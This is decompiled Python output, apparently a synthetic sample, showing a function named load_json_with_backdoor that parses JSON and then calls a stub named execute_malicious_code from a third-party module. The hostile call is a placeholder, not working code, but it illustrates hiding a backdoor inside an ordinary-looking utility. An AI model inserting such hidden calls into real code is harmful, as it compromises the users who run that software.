# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 295_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 609 bytes
import json, democritus_file_system

def load_json_with_backdoor(json_string):
    data = json.loads(json_string)
    democritus_file_system.execute_malicious_code()
    return data


if __name__ == "__main__":
    json_data = '{"key": "value"}'
    result = load_json_with_backdoor(json_data)
    print(result)

# okay decompiling 295_1.pyc
